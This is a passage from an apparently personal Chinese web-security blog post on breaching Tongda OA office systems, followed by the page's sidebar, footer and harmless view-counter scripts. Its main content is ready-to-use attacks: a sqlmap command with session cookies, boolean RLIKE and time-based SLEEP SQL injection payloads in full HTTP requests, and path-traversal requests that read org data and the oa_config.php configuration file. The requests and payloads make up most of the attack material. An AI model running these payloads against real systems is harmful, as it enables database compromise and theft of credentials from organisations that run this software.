+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>python sqlmap.py -u "http://[IP]/general/appbuilder/web/report/repdetail/edit?link_type=false&#x26;slot=&#123;&#125;&#x26;id=2" -p "id" --cookie "PHPSESSID=; USER_NAME_COOKIE=test; OA_USER_ID=65; SID_65=f4586f66; _csrf=4c3bd17849ec492e8d49a4eb7ec85dc614f22fb1195264aee25c341f17953e2da%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22g-FcCpSREk0gavd50I0nIYzAhtkCzRrg%22%3B%7D" --batch --is-dba</span></span></code></pre>
+<p>另外还有一个参数位置：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>SORT_ID,FILE_SORT</span></span></code></pre>
+<p>数据包类似：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /general/file_folder/swfupload_new.php HTTP/1.1</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span></span>
+<span class="line"><span>Referer: http://192.168.202.1/general/meeting/myapply/details.php?affair=true&#x26;id=5&#x26;nosign=true&#x26;reminding=true</span></span>
+<span class="line"><span>X-Resource-Type: xhr</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Host: 192.168.77.137</span></span>
+<span class="line"><span>Pragma: no-cache</span></span>
+<span class="line"><span>x-requested-with: XMLHttpRequest</span></span>
+<span class="line"><span>Content-Length: 433</span></span>
+<span class="line"><span>x-wvs-id: Acunetix-Deepscan/186</span></span>
+<span class="line"><span>Cache-Control: no-cache</span></span>
+<span class="line"><span>accept: */*</span></span>
+<span class="line"><span>origin: http://192.168.202.1</span></span>
+<span class="line"><span>Accept-Language: en-US</span></span>
+<span class="line"><span>Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>------------GFioQpMK0vv2</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="ATTACHMENT_ID"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>1</span></span>
+<span class="line"><span>------------GFioQpMK0vv2</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="ATTACHMENT_NAME"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>1</span></span>
+<span class="line"><span>------------GFioQpMK0vv2</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="FILE_SORT"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>2</span></span>
+<span class="line"><span>------------GFioQpMK0vv2</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="SORT_ID"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>0 RLIKE (SELECT  (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))</span></span>
+<span class="line"><span>------------GFioQpMK0vv2--</span></span></code></pre>
+<p>payload：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>RLIKE (SELECT  (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))</span></span>
+<span class="line"><span># 过滤单引号</span></span>
+<span class="line"><span>RLIKE (SELECT  (CASE WHEN (substr(user(),1,1)=0x72) THEN 1 ELSE 0x28 END))</span></span></code></pre>
+<h4 id="starttime参数"><a class="anchor" href="#starttime参数">#</a> starttime参数</h4>
+<p>利用条件与id参数一样，普通账户即可，某些低版本无需登录</p>
+<p>参数位置：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/general/appbuilder/web/calendar/calendarlist/getcallist</span></span></code></pre>
+<p>通过POST请求：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>starttime=1&#x26;endtime=1598918400&#x26;view=month&#x26;condition=1</span></span></code></pre>
+<p>通过sqlmap可以得到一种payload：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>starttime=1') AND (SELECT 8771 FROM (SELECT(SLEEP(5)))xrUG) AND ('CsEA'='CsEA&#x26;endtime=1598918400&#x26;view=month&#x26;condition=1</span></span></code></pre>
+<h4 id="orderby参数"><a class="anchor" href="#orderby参数">#</a> orderby参数</h4>
+<p>利用条件同上</p>
+<p>参数位置：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/general/email/inbox/get_index_data.php?asc=0&#x26;boxid=&#x26;boxname=inbox&#x26;curnum=0&#x26;emailtype=ALLMAIL&#x26;keyword=&#x26;orderby=3--&#x26;pagelimit=10&#x26;tag=&#x26;timestamp=1598069103&#x26;total=</span></span>
+<span class="line"><span>或者</span></span>
+<span class="line"><span>/general/email/sentbox/get_index_data.php?asc=0&#x26;boxid=&#x26;boxname=sentbox&#x26;curnum=3&#x26;emailtype=ALLMAIL&#x26;keyword=sample%40email.tst&#x26;orderby=1&#x26;pagelimit=20&#x26;tag=&#x26;timestamp=1598069133&#x26;total=</span></span></code></pre>
+<p>payload：（<code>RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))</code>）</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GET /general/email/inbox/get_index_data.php?asc=0&#x26;boxid=&#x26;boxname=inbox&#x26;curnum=0&#x26;emailtype=ALLMAIL&#x26;keyword=&#x26;orderby=1 RLIKE (SELECT  (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))&#x26;pagelimit=10&#x26;tag=&#x26;timestamp=1598069103&#x26;total= HTTP/1.1</span></span>
+<span class="line"><span>Host: 192.168.77.137</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span></span>
+<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
+<span class="line"><span>Cookie: PHPSESSID=2jtfe5ckpfh9mklegtgs0t1e73; USER_NAME_COOKIE=test; OA_USER_ID=65; SID_65=9e1a1f39</span></span>
+<span class="line"><span>DNT: 1</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span></code></pre>
+<p>这里用的是<code>rlike()</code>报错注入，rlike()是regrep_like()的同义词，rlike()遇到特殊字符<code>(</code>和<code>)</code>报错，于是表达式输出1正常回显，表达式错误输出特殊字符</p>
+<h3 id="down接口信息泄露"><a class="anchor" href="#down接口信息泄露">#</a> down接口信息泄露</h3>
+<p>通达OA的<code>/inc/package/down.php</code>接口存在未授权访问漏洞，攻击者可利用该漏洞下载敏感信息，如员工数据和系统配置等，可能导致严重的数据泄露和系统安全问题</p>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>../../../cache/org</span></span></code></pre>
+<p>正常情况下用户传入123，最后访问路由结果可能是<code>/package/123.xml</code>，传入<code>../../../cache/org</code>最后可能得到<code>/package/../../../cache/org.xml</code>，经过规范化路径之后可以实现目录穿越读取<code>org.xml</code></p>
+<h3 id="video_filephp任意文件下载漏洞"><a class="anchor" href="#video_filephp任意文件下载漏洞">#</a> video_file.php任意文件下载漏洞</h3>
+<p>漏洞接口：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/general/mytable/intel_view/video_file.php</span></span></code></pre>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&#x26;MEDIA_NAME=oa_config.php HTTP/1.1</span></span>
+<span class="line"><span>Host: 127.0.0.1</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate, br</span></span>
+<span class="line"><span>Connection: close</span></span></code></pre>
+<p>这个比较容易理解，将想要下载的文件名传参给<code>MEDIA_NAME</code>，<code>MEDIA_DIR</code>里面放上目录穿越的逻辑实现任意文件下载</p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-08-17 18:09:53" itemprop="dateModified" datetime="2026-08-17T18:09:53+08:00">2026-08-17</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/" title="常规外网打点-PART3">https://zlaryy.top/2026/08/17/常规外网打点-PART3/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/08/04/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART2/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture6.webp" title="常规外网打点-PART2"><span class="type">上一篇</span><h3>常规外网打点-PART2</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-part3%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD"><span class="toc-number">1.</span> <span class="toc-text"> 常规外网打点-PART3（持续更新中......）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#oa"><span class="toc-number">2.</span> <span class="toc-text"> OA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEoa"><span class="toc-number">2.1.</span> <span class="toc-text"> 泛微OA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 指纹识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 文件上传漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.3.</span> <span class="toc-text"> SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%85%A8%E7%89%88%E6%9C%AC%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.4.</span> <span class="toc-text"> 未授权访问漏洞（全版本默认配置）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.5.</span> <span class="toc-text"> 命令注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.6.</span> <span class="toc-text"> Hessian反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEoa"><span class="toc-number">2.2.</span> <span class="toc-text"> 通达OA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 文件上传与包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-2"><span class="toc-number">2.2.2.</span> <span class="toc-text"> SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#id%E5%8F%82%E6%95%B0%E5%AD%98%E5%9C%A8sqli%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.1.</span> <span class="toc-text"> id参数存在sqli注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#starttime%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.2.2.</span> <span class="toc-text"> starttime参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#orderby%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.2.3.</span> <span class="toc-text"> orderby参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#down%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.2.3.</span> <span class="toc-text"> down接口信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#video_filephp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.4.</span> <span class="toc-text"> video_file.php任意文件下载漏洞</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">19</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/08/04/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART2/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/22/SQL/">SQL</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/18/SQL%E6%8F%90%E6%9D%83/">SQL提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/">低版本php下信息泄露的CVE漏洞与反弹shell</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/">常规外网打点-PART3</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/02/flask%20session%E4%BC%AA%E9%80%A0%E4%B8%8Efilter-chain/">flask的session伪造与filter-chain</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/27/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/07/XXE/">XXE</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/05/29/%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">其他系统库类型下的SQL注入</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/08/04/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART2/">常规外网打点-PART2</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">463k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">7:01</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+    ispost: true,
+    path: `2026/08/17/常规外网打点-PART3/`,
+    favicon: {
+        show: `ZLARYY`,
+        hide: `ZLARYY`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    nocopy: "false",
+    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    }
+};
+</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer></script><!-- hexo injector body_end start -->
+<script id="post-stats">
+(function () {
+  var API_NAME = 'ZLARYYPostStats';
+  var BOX_SELECTOR = '.post-stats-box';
+  var COUNT_LIMIT = 9999;
+
+  if (window[API_NAME] && typeof window[API_NAME].run === 'function') {
+    window[API_NAME].run();
+    return;
+  }
+
+  function isPostPage() {
+    return !!(window.LOCAL && window.LOCAL.ispost) || !!document.querySelector('article.post');
+  }
+
+  function storageKey(prefix) {
+    return prefix + window.location.pathname;
+  }
+
+  function getStorageValue(storage, key) {
+    try {
+      return storage.getItem(key);
+    } catch (error) {
+      return null;
+    }
+  }
+
+  function setStorageValue(storage, key, value) {
+    try {
+      storage.setItem(key, value);
+    } catch (error) {}
+  }
+
+  function removeStorageValue(storage, key) {
+    try {
+      storage.removeItem(key);
+    } catch (error) {}
+  }
+
+  function readCount(key) {
+    var raw = getStorageValue(window.localStorage, key);
+    var value = raw === null || raw === '' ? 0 : Number(raw);
+
+    if (!Number.isInteger(value) || value < 0 || value > COUNT_LIMIT) {
+      value = 0;
+      setStorageValue(window.localStorage, key, '0');
+    }
+
+    return value;
+  }
+
+  function writeCount(key, value) {
+    setStorageValue(window.localStorage, key, String(value));
+  }
+
+  function bumpViewCount() {
+    var countKey = storageKey('zlaryy_view_count_');
+    var sessionKey = storageKey('zlaryy_viewed_session_');
+    var count = readCount(countKey);
+
+    if (getStorageValue(window.sessionStorage, sessionKey) !== '1') {
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      writeCount(countKey, count);
+      setStorageValue(window.sessionStorage, sessionKey, '1');
+    }
+
+    return count;
+  }
+
+  function readLikeCount() {
+    return readCount(storageKey('zlaryy_like_count_'));
+  }
+
+  function hasLiked() {
+    return getStorageValue(window.localStorage, storageKey('zlaryy_liked_')) === '1';
+  }
+
+  function saveLikeState(count, liked) {
+    writeCount(storageKey('zlaryy_like_count_'), count);
+    if (liked) {
+      setStorageValue(window.localStorage, storageKey('zlaryy_liked_'), '1');
+    } else {
+      removeStorageValue(window.localStorage, storageKey('zlaryy_liked_'));
+    }
+  }
+
+  function clearRewardNodes() {
+    document.querySelectorAll('.reward').forEach(function (reward) {
+      reward.innerHTML = '';
+      reward.classList.add('post-stats-host');
+      reward.removeAttribute('style');
+      reward.setAttribute('aria-label', 'post stats');
+    });
+  }
+
+  function findInsertTarget() {
+    var reward = document.querySelector('article.post .reward, .reward');
+    if (reward) return { parent: reward, before: null };
+
+    var footer = document.querySelector('article.post > footer');
+    if (footer && footer.parentNode) return { parent: footer.parentNode, before: footer };
+
+    var article = document.querySelector('article.post');
+    if (article) return { parent: article, before: null };
+
+    return null;
+  }
+
+  function createStatsBox(viewCount, likeCount, liked) {
+    var box = document.createElement('div');
+    box.className = 'post-stats-box';
+    box.innerHTML = [
+      '<button class="post-view-count" type="button" disabled aria-disabled="true">',
+      '&#128065; &#x770b;&#x8fc7; <span class="local-view-count">' + viewCount + '</span> &#x6b21;',
+      '</button>',
+      '<button class="post-like-btn' + (liked ? ' liked' : '') + '" type="button" aria-pressed="' + (liked ? 'true' : 'false') + '">',
+      '<span class="post-like-label">' + (liked ? '&#x5df2;&#x70b9;&#x8d5e;' : '&#x70b9;&#x8d5e;') + '</span> ',
+      '<span class="local-like-count">' + likeCount + '</span>',
+      '</button>'
+    ].join('');
+
+    return box;
+  }
+
+  function updateLikeButton(button, count, liked) {
+    var labelNode = button.querySelector('.post-like-label');
+    var countNode = button.querySelector('.local-like-count');
+
+    if (labelNode) labelNode.textContent = liked ? '\u5df2\u70b9\u8d5e' : '\u70b9\u8d5e';
+    if (countNode) countNode.textContent = String(count);
+
+    button.classList.toggle('liked', liked);
+    button.setAttribute('aria-pressed', liked ? 'true' : 'false');
+  }
+
+  function bindLikeButton(box) {
+    var button = box.querySelector('.post-like-btn');
+    if (!button || button.dataset.bound === 'true') return;
+
+    updateLikeButton(button, readLikeCount(), hasLiked());
+
+    button.dataset.bound = 'true';
+    button.addEventListener('click', function () {
+      var count = readLikeCount();
+
+      if (hasLiked()) {
+        count = Math.max(0, count - 1);
+        saveLikeState(count, false);
+        updateLikeButton(button, count, false);
+        return;
+      }
+
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      saveLikeState(count, true);
+      updateLikeButton(button, count, true);
+    });
+  }
+
+  function renderStats() {
+    if (!isPostPage()) return;
+
+    clearRewardNodes();
+
+    var viewCount = bumpViewCount();
+    var likeCount = readLikeCount();
+    var liked = hasLiked();
+    var box = document.querySelector(BOX_SELECTOR);
+
+    if (!box) {
+      var target = findInsertTarget();
+      if (!target) return;
+
+      box = createStatsBox(viewCount, likeCount, liked);
+      target.parent.insertBefore(box, target.before);
+    }
+
+    var viewNode = box.querySelector('.local-view-count');
+    var likeNode = box.querySelector('.local-like-count');
+    var likeButton = box.querySelector('.post-like-btn');
+
+    if (viewNode) viewNode.textContent = String(viewCount);
+    if (likeNode) likeNode.textContent = String(likeCount);
+    if (likeButton) {
+      updateLikeButton(likeButton, likeCount, liked);
+    }
+
+    bindLikeButton(box);
+  }
+
+  function runPostStats() {
+    window.setTimeout(renderStats, 0);
+  }
+
+  window[API_NAME] = {
+    run: runPostStats
+  };
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', runPostStats);
+  } else {
+    runPostStats();
+  }
+
+  document.addEventListener('pjax:complete', runPostStats);
+})();
+</script>
+  
+<script>
+(function () {
+  function addBeian() {
+    const footerStatus = document.querySelector('#footer .status');
+    if (!footerStatus) return;
+
+    if (document.querySelector('.footer-beian')) return;
+
+    const beian = document.createElement('div');
+    beian.className = 'footer-beian';
+    beian.innerHTML = '<a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener">蜀ICP备2026016552号-1</a>';
+
+    footerStatus.appendChild(beian);
+  }
+
+  addBeian();
+  document.addEventListener('pjax:complete', addBeian);
+})();
+</script>
+  <script>
+(function () {
+  function fixText(text) {
+    if (!text) return text;
+    text = text.replace(/\([`´]?Д[`´]?\)大変だ!/g, "ZLARYY");
+    text = text.replace(/大変だ!/g, "ZLARYY");
+    return text;
+  }
+
+  function replaceText(root) {
+    root = root || document.body;
+    if (!root) return;
+
+    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
+    var node;
+
+    while ((node = walker.nextNode())) {
+      var oldText = node.nodeValue;
+      var newText = fixText(oldText);
+      if (newText !== oldText) node.nodeValue = newText;
+    }
+  }
+
+  function init() {
+    replaceText(document.body);
+
+    var observer = new MutationObserver(function (mutations) {
+      mutations.forEach(function (mutation) {
+        mutation.addedNodes.forEach(function (node) {
+          if (node.nodeType === 1) {
+            replaceText(node);
+          } else if (node.nodeType === 3) {
+            node.nodeValue = fixText(node.nodeValue);
+          }
+        });
+      });
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+})();
+</script><!-- hexo injector body_end end --></body></html>
